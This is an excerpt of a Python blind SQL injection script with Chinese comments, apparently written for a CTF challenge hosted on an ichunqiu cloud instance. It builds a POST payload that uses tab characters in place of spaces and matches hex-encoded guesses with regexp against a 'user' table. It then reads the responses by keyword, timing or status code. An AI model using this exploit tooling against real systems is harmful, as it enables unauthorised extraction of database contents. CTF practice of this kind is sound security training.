...
def req(num=0,char="",sympol="",code=0):
    ...
    try:
        ...
        if(reqMethod=="get"):
            ...
            httpResp=getattr(res,reqMethod)(url=url,params=params,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
        elif(reqMethod=="post"):
            #在这里构造post数据
            data={
                "id":"1\tand\t(select\t0x61\tfrom\tuser\tregexp\t{}\t)".format(str2hex(char))
            }
            httpResp=getattr(res,reqMethod)(url=url,data=data,headers=header,cookies=cookie,timeout=timeOut,allow_redirects=redirects)
        else:
        ...
        if(checkMethod[:4]=="time"):
            ...
            return check(httpResp=httpResp)    

def check(httpResp=False,timeFlag=False):
    ...
    if(checkMethod[:4]=="text"):
        ...
        return timeFlag
    elif(checkMethod[:6]=="status"):
        print("[+]Status_code:"+str(httpResp.status_code))
        if(checkMethod[6:]==str(httpResp.status_code)):
            return True
        else:
            return False
        #目前没啥用以后想到了再添加    
...
if __name__ == '__main__' :
    ...
    theCheckMethod  检查方式可以为 textX 、 timeX 、 statusX 三种(前4字母代表主方式,最后X代表次方式)
                    textX: X可以为A代表关键字B代表检测图片C代表返回行
                    timeX: X为纯数字代表超时时间(可以写小数)
                    statusX: X可以为返回包网页状态码
                    默认为textA(添了个没写的else)
    ...
    '''
    url="http://eci-2zeay9ysidnmtjhrb746.cloudeci1.ichunqiu.com/"
    method="csB"
    ...
    sleep=0.2
    setNum=5
    theKeyString=":2022/08/23"
    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theSleep=sleep,setNum=setNum,theKeyString=theKeyString)
    #setNum=0
    #theReqMethod=''
    #theKeyString=""
